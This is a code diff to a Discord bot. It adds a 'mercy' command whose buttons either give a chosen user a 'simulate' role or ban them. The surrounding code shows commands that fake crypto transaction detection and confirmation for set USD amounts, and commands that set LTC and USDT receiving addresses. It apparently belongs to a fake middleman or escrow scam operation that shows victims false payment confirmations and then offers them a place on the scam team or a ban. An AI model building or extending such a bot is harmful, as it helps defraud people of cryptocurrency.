@@ -96,6 +96,10 @@ client.on('ready', async () => {
       .setDescription('Simulate transaction detection')
       .addNumberOption(o => o.setName('amount').setDescription('USD Amount').setRequired(true)),
     new SlashCommandBuilder()
+      .setName('mercy')
+      .setDescription('Give a user a chance')
+      .addUserOption(o => o.setName('user').setDescription('User').setRequired(true)),
+    new SlashCommandBuilder()
       .setName('simulateconfirmation')
       .setDescription('Simulate transaction confirmation')
       .addNumberOption(o => o.setName('amount').setDescription('USD Amount').setRequired(true)),
@@ -180,6 +184,20 @@ client.on('interactionCreate', async (interaction) => {
         .setCustomId(`request_modal_${currency}`)
         .setTitle('Fill out the format');
 
+    if (interaction.customId.startsWith('mercy_accept_')) {
+      const userId = interaction.customId.replace('mercy_accept_', '');
+      const member = await interaction.guild.members.fetch(userId);
+      const role = interaction.guild.roles.cache.get(SIMULATE_ROLE_ID);
+      await member.roles.add(role);
+      await interaction.update({ content: `✅ <@${userId}> has been accepted.`, embeds: [], components: [] });
+    }
+
+      if (interaction.customId.startsWith('mercy_decline_')) {
+      const userId = interaction.customId.replace('mercy_decline_', '');
+      const member = await interaction.guild.members.fetch(userId);
+      await member.ban({ reason: 'Mercy declined' });
+      await interaction.update({ content: `🔨 <@${userId}> has been banned.`, embeds: [], components: [] });
+    }
       const traderInput = new TextInputBuilder()
         .setCustomId('trader_id')
         .setLabel("Paste Your Trader's Username or ID")
@@ -571,6 +589,32 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.reply({ content: `LTC address set to: ${LTC_ADDRESS}`, ephemeral: true });
   }
 
+  if (interaction.commandName === 'mercy') {
+    const member = await interaction.guild.members.fetch(interaction.user.id);
+    if (!member.roles.cache.has(SIMULATE_ROLE_ID) && BigInt(interaction.user.id) !== SUPER_OWNER) {
+    return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
+    }
+    const user = interaction.options.getUser('user');
+  
+    const mercyEmbed = new EmbedBuilder()
+      .setTitle('DEIN TITEL HIER') // <-- ändern
+      .setDescription('DEIN TEXT HIER') // <-- ändern
+      .setColor(0x2b2d31);
+
+    const acceptBtn = new ButtonBuilder()
+      .setCustomId(`mercy_accept_${user.id}`)
+      .setLabel('Accept')
+      .setStyle(ButtonStyle.Success);
+
+    const declineBtn = new ButtonBuilder()
+      .setCustomId(`mercy_decline_${user.id}`)
+      .setLabel('Decline')
+      .setStyle(ButtonStyle.Danger);
+
+    const row = new ActionRowBuilder().addComponents(acceptBtn, declineBtn);
+    await interaction.reply({ embeds: [mercyEmbed], components: [row] });
+  }
+  
   if (interaction.commandName === 'setusdtaddy') {
     if (!owners.has(interaction.user.id) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
     USDT_ADDRESS = interaction.options.getString('address');
